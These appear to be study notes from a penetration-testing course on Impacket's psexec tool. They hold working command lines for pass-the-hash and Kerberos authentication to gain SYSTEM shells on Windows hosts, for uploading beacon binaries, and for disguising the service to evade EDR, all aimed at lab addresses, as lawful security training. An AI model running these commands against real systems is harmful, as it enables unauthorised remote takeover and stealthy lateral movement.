# impacket-psexec

**Tags:** `#impacket` `#psexec` `#lateralmovement` `#passthehash` `#auth` `#rce`

Remote command execution / semi-interactive SYSTEM shell over SMB, using Impacket's
Python reimplementation of the PsExec technique (via the bundled **RemComSvc**). The
go-to "I have admin creds/hash on a Windows host — give me a shell" tool. Authenticates
with a password, an **NT hash** (pass-the-hash), or a **Kerberos** ticket.

**Source:** https://github.com/fortra/impacket (`examples/psexec.py`)
**Install:** pre-installed on Kali as `impacket-psexec` (the whole suite ships as `impacket-*`)

> [!warning] **Loud by design** — psexec drops a service binary into `ADMIN$`, registers
> a Windows **service**, and starts it. That means a written file + Service Control
> Manager event (**7045**) + likely EDR alert. When stealth matters, prefer
> [[Tools/Local System Management/wmiexec|wmiexec]] (no binary, no service) — see the
> decision table below.

> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] PtH/PtT shell after a
> cert-derived hash/ticket; [[Tools/Lateral Movement/impacket|impacket]] (suite overview);
> [[Tools/AD/impacket-kerberos-scripts|impacket-kerberos-scripts]] for getting the ticket
> `-k` consumes. Also used in
> [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]] and
> [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (CPTS v2).

---

## Target / Authentication Syntax

```bash
# target format: [[domain/]username[:password]@]<host or IP>

# Plaintext password (prompts if omitted)
impacket-psexec administrator:'Passw0rd!'@10.129.201.126
impacket-psexec inlanefreight.htb/julio@dc01            # prompts for password

# Pass-the-Hash — NT hash only, leave the LM half blank
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# Kerberos from a ccache (export KRB5CCNAME first) — no password
KRB5CCNAME=julio.ccache impacket-psexec -k -no-pass inlanefreight.htb/julio@dc01.inlanefreight.htb

# Kerberos with an AES key (overpass-the-hash style)
impacket-psexec -k -aesKey <hex> inlanefreight.htb/julio@dc01.inlanefreight.htb

# When the target is a NetBIOS name you can't resolve, pin the IP
impacket-psexec administrator@DC01 -target-ip 10.129.201.126 -dc-ip 10.129.201.10
```

> [!tip] **-k needs the FQDN.** Kerberos auth fails against a bare IP or short name —
> use the full `host.domain.tld` so the SPN matches the ticket. Clock skew > 5 min also
> breaks it (`KRB_AP_ERR_SKEW`) — sync with `ntpdate`/`faketime`.

---

## What You Get / How It Works

1. Connects to `ADMIN$`, uploads a service executable (RemComSvc, random-ish name).
2. Creates + starts a Windows service pointing at that binary.
3. Relays your I/O over a named pipe → **interactive shell running as `NT AUTHORITY\SYSTEM`**.
4. On exit it stops/deletes the service and removes the binary (crash = leftovers).

```bash
# Default is an interactive cmd.exe SYSTEM shell
impacket-psexec administrator@10.129.201.126 -hashes :<NT>

# Run one command instead of a shell
impacket-psexec administrator@10.129.201.126 -hashes :<NT> 'whoami /all'

# Upload + run YOUR binary rather than cmd (e.g. a beacon)
impacket-psexec administrator@10.129.201.126 -hashes :<NT> -c beacon.exe -path C:\\Windows\\Temp
```

---

## OPSEC / Evasion Knobs

The default service name and binary name are static-ish signatures that AV/EDR and
threat hunters key on. Randomise them:

```bash
# Blend the service in with a plausible name; rename the dropped binary
impacket-psexec administrator@10.129.201.126 -hashes :<NT> \
  -service-name "WindowsUpdateSvc" -remote-binary-name "wuauclt.exe"

# Fix garbled non-English output (map the target codepage from chcp.com)
impacket-psexec administrator@10.129.201.126 -hashes :<NT> -codec cp850
```

Even renamed, the file-write + service-create pattern remains — for a quieter footprint
switch execution method entirely (below).

---

## Choosing an Impacket Exec Method

All ship in the same package and take the **same auth flags** (`-hashes` / `-k` / `-aesKey`).
Pick by privilege needed vs noise tolerated:

| Tool | Mechanism | Runs as | Artifacts / Noise | Use when |
|---|---|---|---|---|
| `impacket-psexec` | SMB: drop binary → **service** | **SYSTEM** | Binary in `ADMIN$` + svc event **7045** — loud | You need SYSTEM and don't care about EDR |
| `impacket-smbexec` | SMB: **service** per command, no binary | SYSTEM | Service events, no dropped exe — semi-interactive via temp files | SYSTEM but want to avoid the binary drop |
| [[Tools/Local System Management/wmiexec\|impacket-wmiexec]] | **WMI** `Win32_Process`, output via `ADMIN$` | The **user** (not SYSTEM) | No service, no binary — quietest of the set | Stealth; user-context is fine |
| `impacket-atexec` | **Scheduled task** (ATSVC) | SYSTEM | Task create/delete events | psexec/wmiexec blocked but Task Scheduler open |
| `impacket-dcomexec` | **DCOM** (MMC20 / ShellWindows) | The user | No service — different parent process tree | Evading service/WMI-based detections |

> [!tip] **Fastest triage:** `impacket-wmiexec` first (quietest, confirms creds work), fall
> back to `impacket-psexec` when you specifically need a **SYSTEM** shell (e.g. to dump
> LSASS or SAM). For scale/spraying across many hosts, NetExec (`nxc smb ... -x`) wraps
> the same primitives with better output.

---

*Created: 2026-07-31*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
